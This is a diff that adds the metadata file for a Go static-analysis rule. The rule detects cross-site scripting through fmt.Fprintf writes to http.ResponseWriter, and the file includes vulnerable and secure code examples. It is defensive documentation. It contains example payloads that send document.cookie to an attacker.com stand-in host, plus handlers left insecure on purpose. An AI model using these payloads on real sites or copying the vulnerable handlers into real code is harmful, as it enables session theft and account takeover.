@@ -1,0 +1,263 @@
+# Rule Identity
+id: GO-XSS-002
+name: XSS via fmt.Fprintf to http.ResponseWriter
+short_description: User input flows into fmt.Fprintf/Fprintln/Fprint writing directly to ResponseWriter — fmt functions perform no HTML escaping, any user-controlled format argument renders as raw HTML in the browser.
+
+# Classification
+severity: HIGH
+category: security
+language: go
+ruleset: golang/GO-XSS-002
+
+# Vulnerability Details
+cwe:
+  - id: CWE-79
+    name: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - id: CWE-116
+    name: "Improper Encoding or Escaping of Output"
+    url: https://cwe.mitre.org/data/definitions/116.html
+
+owasp:
+  - id: A03:2021
+    name: Injection
+    url: https://owasp.org/Top10/A03_2021-Injection/
+
+tags:
+  - go
+  - security
+  - xss
+  - responsewriter
+  - fmt
+  - reflected-xss
+  - CWE-79
+  - CWE-116
+  - OWASP-A03
+
+# Author
+author:
+  name: Shivasurya
+  url: https://x.com/sshivasurya
+
+# Content
+description: |
+  `fmt.Fprintf`, `fmt.Fprintln`, and `fmt.Fprint` write raw bytes to any `io.Writer`,
+  including `http.ResponseWriter`. Unlike `html/template`, these functions perform **zero
+  HTML escaping** — every character in the format arguments reaches the browser exactly
+  as provided. When user-controlled data flows into these calls without prior escaping,
+  attackers inject arbitrary HTML and JavaScript into the response.
+
+  **Why fmt.Fprintf is particularly dangerous**:
+  The Go standard library's deliberate division of responsibilities places HTML escaping
+  in `html/template` and leaves `fmt` as a raw byte writer. Developers accustomed to
+  server-side templating in other languages may not realize that `fmt.Fprintf(w, "<p>%s</p>", userInput)`
+  is equivalent to `w.Write([]byte("<p>" + userInput + "</p>"))` — both write unescaped bytes.
+
+  **XSS attack surface via fmt.Fprintf**:
+  - **Format string injection**: `fmt.Fprintf(w, userInput)` — if the user controls the format
+    string itself, `%!` verbs can cause unexpected behavior; HTML tags execute directly.
+  - **Format argument injection**: `fmt.Fprintf(w, "<p>Hello %s</p>", name)` — attacker sets
+    `name` to `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`.
+  - **Chained template fragments**: Building HTML by concatenating `fmt.Sprintf` results and
+    later writing the assembled string to the response — taint survives across the intermediate
+    variable.
+  - **JSON responses with incorrect Content-Type**: `fmt.Fprintf(w, `{"user":"%s"}`, username)`
+    without setting `Content-Type: application/json` — browsers sniff the content and may
+    render it as HTML if the response starts with `<`.
+
+  **Content-Type sniffing**:
+  Go's `net/http` calls `http.DetectContentType()` on the first 512 bytes of the response
+  body if no explicit `Content-Type` header is set. A response starting with `{` or `[`
+  gets `text/plain; charset=utf-8`; starting with `<` gets `text/html; charset=utf-8`.
+  Setting the correct Content-Type header is a mitigation layer, but browsers with MIME
+  type sniffing enabled (or `X-Content-Type-Options: nosniff` missing) may still execute
+  injected scripts in `text/plain` responses when served inline.
+
+  **Reflected vs. Stored XSS via fmt.Fprintf**:
+  - **Reflected**: The injected value comes from the current request (query param, form field,
+    URL segment) and is immediately written to the response. The attacker crafts a malicious
+    URL and tricks the victim into clicking it.
+  - **Stored**: The value was previously stored in a database and is now retrieved and written
+    with `fmt.Fprintf`. All visitors to the page receive the attack payload. Taint analysis
+    must track the dataflow through the database query and result scanning.
+
+  **Impact of XSS**:
+  - Session hijacking via `document.cookie` theft (if `HttpOnly` flag is absent)
+  - Keylogging by injecting `<script>document.onkeydown=function(e){...}</script>`
+  - DOM manipulation to insert phishing content on a trusted domain
+  - Browser-based cryptomining or botnet participation
+  - Redirection to drive-by download pages via `window.location = "https://malware.example"`
+
+  **Go-specific remediation path**:
+  `html/template` is the authoritative solution — it performs context-aware escaping
+  based on where the value appears (HTML body, attribute, URL, JavaScript string, CSS).
+  `html.EscapeString()` handles the HTML body context but does not protect attribute
+  values containing JavaScript event handlers or `href="javascript:..."` patterns.
+
+message: |
+  User-controlled input flows into fmt.Fprintf/Fprintln/Fprint writing to ResponseWriter without
+  HTML escaping. Use html/template.Execute() for structured HTML responses, or wrap values
+  with html.EscapeString() for inline escaping. Set Content-Type header explicitly on all responses.
+
+security_implications:
+  - title: Session Hijacking via Cookie Theft
+    description: |
+      XSS payloads using `document.cookie` can exfiltrate session tokens to attacker
+      infrastructure. Any session cookie without the `HttpOnly` flag is vulnerable.
+      Even HttpOnly cookies can be bypassed by XSS that makes authenticated requests
+      directly from the victim's browser (CSRF-style XSS exploitation).
+  - title: Credential Harvesting on Trusted Domain
+    description: |
+      Injected HTML replaces login form `action` attributes or overlays the page with a
+      pixel-perfect phishing form hosted on the legitimate domain. Victims see the correct
+      domain in the address bar and trust the form. All submitted credentials go to the
+      attacker's endpoint.
+  - title: Persistent XSS in Stored Data Flows
+    description: |
+      When `fmt.Fprintf` writes values retrieved from a database, the XSS becomes stored
+      (persistent). Every user who loads the page receives the payload. A single stored
+      XSS in an admin interface can escalate to full account takeover for all administrators.
+  - title: Cross-Origin Data Exfiltration
+    description: |
+      XSS executing in a privileged origin can use `fetch()` to read internal resources,
+      extract CSRF tokens from other pages, and probe internal network endpoints via the
+      victim's browser — bypassing firewall rules that allow the browser but not external IPs.
+
+vulnerable_example: |
+  // VULNERABLE: fmt.Fprintf with user input as format argument
+  func searchHandler(w http.ResponseWriter, r *http.Request) {
+      query := r.URL.Query().Get("q")
+      // Attacker: ?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
+      fmt.Fprintf(w, "<html><body><h1>Results for: %s</h1></body></html>", query)
+  }
+
+  // VULNERABLE: fmt.Fprintln writes raw user data
+  func profileHandler(w http.ResponseWriter, r *http.Request) {
+      username := r.FormValue("username")
+      fmt.Fprintln(w, "<div class=\"user\">"+username+"</div>")
+  }
+
+  // VULNERABLE: user input as format string (also enables format string confusion)
+  func echoHandler(w http.ResponseWriter, r *http.Request) {
+      msg := r.FormValue("msg")
+      fmt.Fprintf(w, msg) // msg itself is the format string — double vulnerability
+  }
+
+  // VULNERABLE: fmt.Sprintf building HTML, then written to response
+  func buildAndWrite(w http.ResponseWriter, r *http.Request) {
+      name := r.FormValue("name")
+      html := fmt.Sprintf("<p>Welcome, %s!</p>", name) // taint survives in variable
+      fmt.Fprint(w, html)                              // taint written to response
+  }
+
+secure_example: |
+  // SECURE: html/template — context-aware escaping (preferred)
+  func searchHandler(w http.ResponseWriter, r *http.Request) {
+      query := r.URL.Query().Get("q")
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      tmpl := template.Must(template.New("search").Parse(
+          `<html><body><h1>Results for: {{.}}</h1></body></html>`))
+      tmpl.Execute(w, query) // auto-escapes query in HTML body context
+  }
+
+  // SECURE: html.EscapeString for inline fmt.Fprintf usage
+  import "html"
+
+  func profileHandler(w http.ResponseWriter, r *http.Request) {
+      username := r.FormValue("username")
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      fmt.Fprintf(w, "<div class=\"user\">%s</div>", html.EscapeString(username))
+  }
+
+  // SECURE: JSON API — set correct Content-Type to prevent HTML interpretation
+  func apiHandler(w http.ResponseWriter, r *http.Request) {
+      username := r.FormValue("username")
+      w.Header().Set("Content-Type", "application/json")
+      // Even if username contains HTML, the browser won't render it as HTML
+      // because Content-Type is application/json + use json.Marshal for proper escaping
+      data := map[string]string{"user": username}
+      json.NewEncoder(w).Encode(data) // json.Marshal HTML-escapes < > & by default
+  }
+
+  // SECURE: pre-compile templates at startup (performance best practice)
+  var searchTmpl = template.Must(template.New("search").Parse(
+      `<html><head><title>Search</title></head><body>
+       <p>Showing results for: {{.Query | html}}</p>
+       </body></html>`))
+
+  type SearchData struct{ Query string }
+
+  func efficientSearchHandler(w http.ResponseWriter, r *http.Request) {
+      w.Header().Set("Content-Type", "text/html; charset=utf-8")
+      w.Header().Set("X-Content-Type-Options", "nosniff")
+      searchTmpl.Execute(w, SearchData{Query: r.URL.Query().Get("q")})
+  }
+
+recommendations:
+  - Replace all fmt.Fprintf/Fprintln/Fprint to ResponseWriter with html/template.Execute().
+  - If fmt.Fprintf is required (e.g., simple error pages), wrap every user value with html.EscapeString().
+  - Always set Content-Type: text/html; charset=utf-8 explicitly — do not rely on auto-detection.
+  - Add X-Content-Type-Options: nosniff header to all responses to prevent MIME sniffing.
+  - Implement Content Security Policy (CSP) as defense-in-depth — script-src 'self' blocks injected inline scripts.
+  - Never pass user input as the format string argument (first argument) to fmt.Fprintf.
+  - Pre-compile html/template instances at startup; template.Must() panics on parse errors at startup rather than runtime.
+  - For JSON APIs, use encoding/json — it HTML-escapes <, >, and & characters by default.
+
+detection_scope: |
+  Tracks taint from HTTP request sources (net/http.Request, gin.Context, echo.Context,
+  fiber.Ctx) to fmt.Fprintf, fmt.Fprintln, and fmt.Fprint calls where the first argument
+  is an http.ResponseWriter. Global inter-procedural scope.
+
+# Compliance
+compliance:
+  - standard: OWASP Top 10
+    requirement: "A03:2021 — Injection (XSS is a subset of injection per OWASP 2021 reclassification)"
+  - standard: CWE Top 25 (2024)
+    requirement: "CWE-79 — Cross-site Scripting (ranked #2 in CWE Top 25 2024)"
+  - standard: PCI DSS v4.0
+    requirement: |
+      Requirement 6.2.4 — Protect web-facing applications against injection attacks
+      including XSS. XSS is explicitly listed as a targeted attack type.
+  - standard: NIST SP 800-53 Rev 5
+    requirement: "SI-10 — Information Input Validation; SI-15 — Information Output Filtering"
+  - standard: HIPAA Security Rule
+    requirement: "§164.312(a)(1) — Access Control; XSS can bypass access controls via session hijacking"
+
+# References
+references:
+  - title: "CWE-79: Cross-site Scripting — MITRE"
+    url: https://cwe.mitre.org/data/definitions/79.html
+  - title: "CWE-116: Improper Encoding or Escaping of Output — MITRE"
+    url: https://cwe.mitre.org/data/definitions/116.html
+  - title: "Go html/template package — context-aware autoescaping"
+    url: https://pkg.go.dev/html/template
+  - title: "Go html package — EscapeString documentation"
+    url: https://pkg.go.dev/html#EscapeString
+  - title: "Go fmt package — Fprintf documentation"
+    url: https://pkg.go.dev/fmt#Fprintf
+  - title: "OWASP XSS Prevention Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+  - title: "OWASP DOM-based XSS Prevention Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+  - title: "OWASP Content Security Policy Cheat Sheet"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+  - title: "Go html/template — Contextual Auto-Escaping Design (blog.golang.org)"
+    url: https://pkg.go.dev/html/template
+  - title: "RFC 7034 — HTTP Header Field X-Frame-Options"
+    url: https://www.rfc-editor.org/rfc/rfc7034
+  - title: "CVE-2023-24538 — backtick injection in Go html/template"
+    url: https://pkg.go.dev/vuln/GO-2023-1703
+  - title: "NIST SP 800-53 Rev 5 — SI-10 Information Input Validation"
+    url: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final
+  - title: "Content Security Policy Level 3 (W3C)"
+    url: https://www.w3.org/TR/CSP3/
+
+# Similar Rules
+similar_rules:
+  - GO-XSS-001
+  - GO-XSS-003
+
+# Test Files
+tests:
+  positive: tests/positive/
+  negative: tests/negative/
